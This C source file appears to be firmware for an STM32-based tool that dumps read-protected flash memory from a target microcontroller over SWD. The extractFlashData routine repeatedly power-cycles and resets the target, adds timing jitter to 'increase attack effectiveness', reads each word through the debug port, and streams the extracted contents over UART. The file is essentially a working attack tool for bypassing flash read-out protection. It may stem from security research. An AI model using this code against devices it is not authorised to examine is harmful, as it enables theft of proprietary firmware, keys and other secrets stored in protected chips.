/* USER CODE BEGIN Header */
/**
  ******************************************************************************
  * @file           : main.c
  * @brief          : Main program body
  ******************************************************************************
  * @attention
  *
  * <h2><center>&copy; Copyright (c) 2020 STMicroelectronics.
  * All rights reserved.</center></h2>
  *
  * This software component is licensed by ST under BSD 3-Clause license,
  * the "License"; You may not use this file except in compliance with the
  * License. You may obtain a copy of the License at:
  *                        opensource.org/licenses/BSD-3-Clause
  *
  ******************************************************************************
  */
/* USER CODE END Header */

/* Includes ------------------------------------------------------------------*/
#include "main.h"

/* Private includes ----------------------------------------------------------*/
/* USER CODE BEGIN Includes */
#include "../Drivers/STM32F1xx_HAL_Driver/Inc/stm32f1xx_hal.h"
#include "swd.h"
#include "target.h"
#include "uart.h"
/* USER CODE END Includes */

/* Private typedef -----------------------------------------------------------*/
/* USER CODE BEGIN PTD */

/* USER CODE END PTD */

/* Private define ------------------------------------------------------------*/
/* USER CODE BEGIN PD */
/* USER CODE END PD */

/* Private macro -------------------------------------------------------------*/
/* USER CODE BEGIN PM */

/* USER CODE END PM */

/* Private variables ---------------------------------------------------------*/
UART_HandleTypeDef huart2;

/* USER CODE BEGIN PV */

/* USER CODE END PV */

/* Private function prototypes -----------------------------------------------*/
void SystemClock_Config(void);
static void MX_GPIO_Init(void);
static void MX_USART2_UART_Init(void);
/* USER CODE BEGIN PFP */
static swdStatus_t extractFlashData( uint32_t const address, uint32_t * const data );
static extractionStatistics_t extractionStatistics = {0u};
static uartControl_t uartControl = {0u};
/* USER CODE END PFP */

/* Private user code ---------------------------------------------------------*/
/* USER CODE BEGIN 0 */
/* Reads one 32-bit word from read-protection Flash memory.
   Address must be 32-bit aligned */
static swdStatus_t extractFlashData( uint32_t const address, uint32_t * const data )
{
  swdStatus_t dbgStatus;

  /* Add some jitter on the moment of attack (may increase attack effectiveness) */
  static uint16_t delayJitter = DELAY_JITTER_MS_MIN;

  uint32_t extractedData = 0u;
  uint32_t idCode = 0u;

  /* Limit the maximum number of attempts PER WORD */
  uint32_t numReadAttempts = 0u;

  /* try up to MAX_READ_TRIES times until we have the data */
  do
  {
    HAL_GPIO_WritePin(LED1_GPIO_Port, LED1_Pin, GPIO_PIN_RESET);

    targetSysOn();

    HAL_Delay(5u);

    dbgStatus = swdInit( &idCode );

    if (likely(dbgStatus == swdStatusOk))
    {
      dbgStatus = swdEnableDebugIF();
    }

    if (likely(dbgStatus == swdStatusOk))
    {
      dbgStatus = swdSetAP32BitMode( NULL );
    }

    if (likely(dbgStatus == swdStatusOk))
    {
      dbgStatus = swdSelectAHBAP();
    }

    if (likely(dbgStatus == swdStatusOk))
    {
      targetSysUnReset();
      HAL_Delay(delayJitter);

      /* The magic happens here! */
      dbgStatus = swdReadAHBAddr( (address & 0xFFFFFFFCu), &extractedData );
    }

    targetSysReset();
    ++(extractionStatistics.numAttempts);

    /* Check whether readout was successful. Only if swdStatusOK is returned, extractedData is valid */
    if (dbgStatus == swdStatusOk)
    {
      *data = extractedData;
      ++(extractionStatistics.numSuccess);
      HAL_GPIO_WritePin(LED1_GPIO_Port, LED1_Pin, GPIO_PIN_SET);
    }
    else
    {
      ++(extractionStatistics.numFailure);
      ++numReadAttempts;

      delayJitter += DELAY_JITTER_MS_INCREMENT;
      if (delayJitter >= DELAY_JITTER_MS_MAX)
      {
        delayJitter = DELAY_JITTER_MS_MIN;
      }
    }

    targetSysOff();

    HAL_Delay(1u);
    targetSysUnReset();
    HAL_Delay(2u);
    targetSysReset();

    HAL_Delay(1u);
  }
  while ((dbgStatus != swdStatusOk) && (numReadAttempts < (MAX_READ_ATTEMPTS)));

  return dbgStatus;
}


void printExtractionStatistics( void )
{
  uartSendStr("Statistics: \r\n");

  uartSendStr("Attempts: 0x");
  uartSendWordHexBE(extractionStatistics.numAttempts);
  uartSendStr("\r\n");

  uartSendStr("Success: 0x");
  uartSendWordHexBE(extractionStatistics.numSuccess);
  uartSendStr("\r\n");

  uartSendStr("Failure: 0x");
  uartSendWordHexBE(extractionStatistics.numFailure);
  uartSendStr("\r\n");
}
/* USER CODE END 0 */

/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void)
{
  /* USER CODE BEGIN 1 */

  /* USER CODE END 1 */

  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();

  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  /* Configure the system clock */
  SystemClock_Config();

  /* USER CODE BEGIN SysInit */

  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
  MX_USART2_UART_Init();
  /* USER CODE BEGIN 2 */
  targetSysCtrlInit();

  uartControl.transmitHex = 0u;
  uartControl.transmitLittleEndian = 1u;
  uartControl.readoutAddress = 0x00000000u;
  uartControl.readoutLen = (64u * 1024u);
  uartControl.active = 0u;

  uint32_t readoutInd = 0u;
  uint32_t flashData = 0xFFFFFFFFu;
  uint32_t btnActive = 0u;
  uint32_t once = 0u;
  swdStatus_t status;

  HAL_GPIO_WritePin(LED1_GPIO_Port, LED1_Pin, GPIO_PIN_SET);
  /* USER CODE END 2 */

  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
  while (1)
  {
    uartReceiveCommands( &uartControl );

    /* Start as soon as the button B1 has been pushed */
    /*if (!HAL_GPIO_ReadPin(BUTTON1_GPIO_Port, BUTTON1_Pin))
    {
      btnActive = 1u;
    }*/
    btnActive = 1u;
    if (uartControl.active || btnActive)
    {
      /* reset statistics on extraction start */
      if (!once)
      {
        once = 1u;

        extractionStatistics.numAttempts = 0u;
        extractionStatistics.numSuccess = 0u;
        extractionStatistics.numFailure = 0u;
      }

      status = extractFlashData((uartControl.readoutAddress + readoutInd), &flashData);

      if (status == swdStatusOk)
      {

        if (!(uartControl.transmitHex))
        {
          uartSendWordBin( flashData, &uartControl );
        }
        else
        {
          uartSendWordHex( flashData, &uartControl );
          uartSendStr(" ");
        }

        readoutInd += 4u;
      }
      else
      {
        if (uartControl.transmitHex)
        {
          uartSendStr("\r\n!ExtractionFailure");
          uartSendWordHexBE( status );
        }
      }

      if ((readoutInd >= uartControl.readoutLen) || (status != swdStatusOk))
      {
        btnActive = 0u;
        uartControl.active = 0u;
        readoutInd = 0u;
        once = 0u;

        /* Print EOF in HEX mode */
        if (uartControl.transmitHex != 0u)
        {
          uartSendStr("\r\n");
        }
      }
    }
    /* USER CODE END WHILE */

    /* USER CODE BEGIN 3 */
  }
  /* USER CODE END 3 */
}

/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void)
{
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};

  /** Initializes the CPU, AHB and APB busses clocks
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_HSE;
  RCC_OscInitStruct.HSEState = RCC_HSE_ON;
  RCC_OscInitStruct.HSEPredivValue = RCC_HSE_PREDIV_DIV1;
  RCC_OscInitStruct.HSIState = RCC_HSI_ON;
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
  RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_HSE;
  RCC_OscInitStruct.PLL.PLLMUL = RCC_PLL_MUL9;
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
  {
    Error_Handler();
  }
  /** Initializes the CPU, AHB and APB busses clocks
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV2;
  RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_2) != HAL_OK)
  {
    Error_Handler();
  }
  /** Enables the Clock Security System
  */
  HAL_RCC_EnableCSS();
}

/**
  * @brief USART2 Initialization Function
  * @param None
  * @retval None
  */
static void MX_USART2_UART_Init(void)
{

  /* USER CODE BEGIN USART2_Init 0 */

  /* USER CODE END USART2_Init 0 */

  /* USER CODE BEGIN USART2_Init 1 */

  /* USER CODE END USART2_Init 1 */
  huart2.Instance = USART2;
  huart2.Init.BaudRate = 115200;
  huart2.Init.WordLength = UART_WORDLENGTH_8B;
  huart2.Init.StopBits = UART_STOPBITS_1;
  huart2.Init.Parity = UART_PARITY_NONE;
  huart2.Init.Mode = UART_MODE_TX_RX;
  huart2.Init.HwFlowCtl = UART_HWCONTROL_NONE;
  huart2.Init.OverSampling = UART_OVERSAMPLING_16;
  if (HAL_UART_Init(&huart2) != HAL_OK)
  {
    Error_Handler();
  }
  /* USER CODE BEGIN USART2_Init 2 */

  /* USER CODE END USART2_Init 2 */

}

/**
  * @brief GPIO Initialization Function
  * @param None
  * @retval None
  */
static void MX_GPIO_Init(void)
{
  GPIO_InitTypeDef GPIO_InitStruct = {0};

  /* GPIO Ports Clock Enable */
  __HAL_RCC_GPIOC_CLK_ENABLE();
  __HAL_RCC_GPIOD_CLK_ENABLE();
  __HAL_RCC_GPIOA_CLK_ENABLE();
  __HAL_RCC_GPIOB_CLK_ENABLE();

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(LED1_GPIO_Port, LED1_Pin, GPIO_PIN_RESET);

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(GPIOA, TARGET_PWR_Pin|TARGET_RESET_Pin|SWDIO_Pin, GPIO_PIN_RESET);

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(SWCLK_GPIO_Port, SWCLK_Pin, GPIO_PIN_RESET);

  /*Configure GPIO pin : LED1_Pin */
  GPIO_InitStruct.Pin = LED1_Pin;
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
  GPIO_InitStruct.Pull = GPIO_NOPULL;
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
  HAL_GPIO_Init(LED1_GPIO_Port, &GPIO_InitStruct);

  /*Configure GPIO pins : PA0 PA1 PA4 PA8
                           PA9 PA10 PA11 PA12
                           PA15 */
  GPIO_InitStruct.Pin = GPIO_PIN_0|GPIO_PIN_1|GPIO_PIN_4|GPIO_PIN_8
                          |GPIO_PIN_9|GPIO_PIN_10|GPIO_PIN_11|GPIO_PIN_12
                          |GPIO_PIN_15;
  GPIO_InitStruct.Mode = GPIO_MODE_ANALOG;
  HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);

  /*Configure GPIO pins : TARGET_PWR_Pin TARGET_RESET_Pin SWDIO_Pin */
  GPIO_InitStruct.Pin = TARGET_PWR_Pin|TARGET_RESET_Pin|SWDIO_Pin;
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
  GPIO_InitStruct.Pull = GPIO_NOPULL;
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_HIGH;
  HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);

  /*Configure GPIO pin : SWCLK_Pin */
  GPIO_InitStruct.Pin = SWCLK_Pin;
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
  GPIO_InitStruct.Pull = GPIO_NOPULL;
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_HIGH;
  HAL_GPIO_Init(SWCLK_GPIO_Port, &GPIO_InitStruct);

  /*Configure GPIO pins : PB1 PB2 PB10 PB11
                           PB12 PB13 PB14 PB15
                           PB3 PB4 PB5 PB6
                           PB7 PB8 PB9 */
  GPIO_InitStruct.Pin = GPIO_PIN_1|GPIO_PIN_2|GPIO_PIN_10|GPIO_PIN_11
                          |GPIO_PIN_12|GPIO_PIN_13|GPIO_PIN_14|GPIO_PIN_15
                          |GPIO_PIN_3|GPIO_PIN_4|GPIO_PIN_5|GPIO_PIN_6
                          |GPIO_PIN_7|GPIO_PIN_8|GPIO_PIN_9;
  GPIO_InitStruct.Mode = GPIO_MODE_ANALOG;
  HAL_GPIO_Init(GPIOB, &GPIO_InitStruct);

}

/* USER CODE BEGIN 4 */

/* USER CODE END 4 */

/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */

  /* USER CODE END Error_Handler_Debug */
}

#ifdef  USE_FULL_ASSERT
/**
  * @brief  Reports the name of the source file and the source line number
  *         where the assert_param error has occurred.
  * @param  file: pointer to the source file name
  * @param  line: assert_param error line source number
  * @retval None
  */
void assert_failed(uint8_t *file, uint32_t line)
{
  /* USER CODE BEGIN 6 */
  /* User can add his own implementation to report the file name and line number,
     tex: printf("Wrong parameters value: file %s on line %d\r\n", file, line) */
  /* USER CODE END 6 */
}
#endif /* USE_FULL_ASSERT */

/************************ (C) COPYRIGHT STMicroelectronics *****END OF FILE****/
